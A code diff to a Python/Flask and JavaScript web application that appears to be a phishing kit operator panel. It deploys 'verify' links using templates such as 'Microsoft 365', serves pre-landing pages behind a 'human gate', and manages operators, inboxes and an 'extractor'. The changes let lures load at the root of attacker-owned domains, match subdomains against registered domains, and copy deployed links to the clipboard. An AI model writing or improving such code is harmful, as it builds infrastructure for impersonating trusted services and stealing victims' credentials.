@@ -6444,6 +6444,12 @@ Assigned      : ${inboxes}
             renderRealtimePreview();
         }
 
+        window.addEventListener('message', function(e) {
+            if (e.data && e.data.type === 'preview_proceed_to_landing') {
+                setPreviewTab('landing');
+            }
+        });
+
         function updatePreviewTitle() {
             const labelEl = document.getElementById('lg-preview-tab-label');
             if (!labelEl) return;
@@ -6886,6 +6892,11 @@ Assigned      : ${inboxes}
 
         async function deployLink() {
             const domain = getEffectiveDomain();
+            if (!domain || domain === '__custom__') {
+                showToast('⚠️ Please select or enter a valid domain');
+                document.getElementById('lg-domain')?.focus();
+                return;
+            }
             const sub = document.getElementById('lg-subdomain')?.value.trim();
             const path = document.getElementById('lg-path')?.value.trim() || 'verify';
             const templateName = document.getElementById('lg-template-select')?.value || 'Microsoft 365';
@@ -6937,7 +6948,8 @@ Assigned      : ${inboxes}
                 const proto = isLocal ? 'http://' : 'https://';
                 const host = (!isLocal && !isTunnel && sub) ? (sub + '.' + domain) : domain;
                 const fullUrl = deployData.url || data.full_url || `${proto}${host}/${path}`;
-                showToast('🚀 Link deployed & activated: ' + fullUrl);
+                try { navigator.clipboard.writeText(fullUrl); } catch(err) {}
+                showToast('🚀 Link deployed & copied: ' + fullUrl);
                 loadDeploymentsTable();
                 
                 // Auto-advance path input to next text slug for this template so sequential deploys don't collide
@@ -6954,6 +6966,7 @@ Assigned      : ${inboxes}
                     }
                 }
             } catch(e) {
+                showToast('❌ Deploy error: ' + (e.message || e));
                 alert('Deploy error: ' + (e.message || e));
             }
         }
@@ -13489,6 +13502,16 @@ def api_operators_reset_device(op_id):
 @app.route('/')
 @app.route('/landing')
 def index():
+    if request.path == '/' and not any(loc in (request.host or '') for loc in ('127.0.0.1', 'localhost')):
+        try:
+            dep = resolve_deployment(request.host, '')
+            if dep:
+                return serve_preland(dep.get('path', ''))
+        except Exception as e:
+            logger.warning(f"Error checking root deployment: {e}")
+
+    if request.path == '/' and session.get('authenticated'):
+        return redirect('/dashboard')
     return render_template_string(CRIMSON_PAW_LANDING_HTML)
 
 @app.route('/dashboard')
@@ -15119,7 +15142,9 @@ def resolve_deployment(host_header, path_slug):
     2. Try matching exact (domain, subdomain, path).
     3. Try matching exact (domain, path) with empty/wildcard subdomain.
     4. Try matching clean_host directly as domain.
-    5. Fallback to path only (for localhost testing and ngrok).
+    5. Check active owned_domains for accurate apex/subdomain splitting.
+    6. If path_clean is empty, match default active deployment on this domain.
+    7. Fallback to path only for local dev/tunnels.
     """
     clean_host = (host_header or '').split(':')[0].strip().lower()
     clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
@@ -15138,8 +15163,26 @@ def resolve_deployment(host_header, path_slug):
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
 
+    # Match against registered owned_domains if present
+    try:
+        owned_rows = conn.execute("SELECT domain FROM owned_domains WHERE status='active'").fetchall()
+        for orow in owned_rows:
+            od = (orow['domain'] or '').strip().lower()
+            if not od:
+                continue
+            if clean_host == od:
+                cand_dom = od
+                cand_sub = ''
+                break
+            elif clean_host.endswith('.' + od):
+                cand_dom = od
+                cand_sub = clean_host[:-len(od)-1]
+                break
+    except Exception:
+        pass
+
     # 1. Exact match on domain, subdomain, path
-    if cand_sub:
+    if cand_sub and path_clean:
         dep = conn.execute(
             "SELECT * FROM deployments WHERE domain=? AND subdomain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
             (cand_dom, cand_sub, path_clean)
@@ -15149,30 +15192,46 @@ def resolve_deployment(host_header, path_slug):
             return dict(dep)
 
     # 2. Match domain + path where subdomain is blank or null
-    dep = conn.execute(
-        "SELECT * FROM deployments WHERE domain=? AND (subdomain='' OR subdomain IS NULL) AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
-        (cand_dom, path_clean)
-    ).fetchone()
-    if dep:
-        conn.close()
-        return dict(dep)
+    if path_clean:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE domain=? AND (subdomain='' OR subdomain IS NULL) AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
+            (cand_dom, path_clean)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
 
-    # 3. Match clean_host directly as domain
-    dep = conn.execute(
-        "SELECT * FROM deployments WHERE domain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
-        (clean_host, path_clean)
-    ).fetchone()
-    if dep:
-        conn.close()
-        return dict(dep)
+    # 3. Match clean_host directly as domain + path
+    if path_clean:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE domain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
+            (clean_host, path_clean)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
 
-    # 4. Fallback match by path only (for local dev, ngrok tunnels)
-    dep = conn.execute(
-        "SELECT * FROM deployments WHERE path=? AND status='active' ORDER BY id DESC LIMIT 1",
-        (path_clean,)
-    ).fetchone()
+    # 4. If path_clean is empty (visiting root of custom domain), match active deployment on this domain
+    if not path_clean and not any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE (domain=? OR domain=?) AND status='active' ORDER BY id DESC LIMIT 1",
+            (cand_dom, clean_host)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    # 5. Fallback match by path only (for local dev, ngrok tunnels)
+    if path_clean and any(loc in clean_host for loc in ('127.0.0.1', 'localhost', 'ngrok', 'loca.lt', 'trycloudflare')):
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE path=? AND status='active' ORDER BY id DESC LIMIT 1",
+            (path_clean,)
+        ).fetchone()
+        conn.close()
+        return dict(dep) if dep else None
+
     conn.close()
-    return dict(dep) if dep else None
+    return None
 
 @app.route('/lp/<path:slug>', methods=['GET'])
 @require_human_gate
@@ -15374,7 +15433,7 @@ def serve_success(slug):
     return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
 
 
-RESERVED_ROOT_PATHS = {'static', 'api', 'dashboard', 'landing', 'app', 'mailbox', 'extractor', 'b2b', 'lp', 'favicon.ico'}
+RESERVED_ROOT_PATHS = {'static', 'api', 'dashboard', 'landing', 'app', 'mailbox', 'extractor', 'b2b', 'lp', 'favicon.ico', 'login', 'logout', 'm'}
 
 @app.route('/<path:slug>', methods=['GET'])
 @require_human_gate
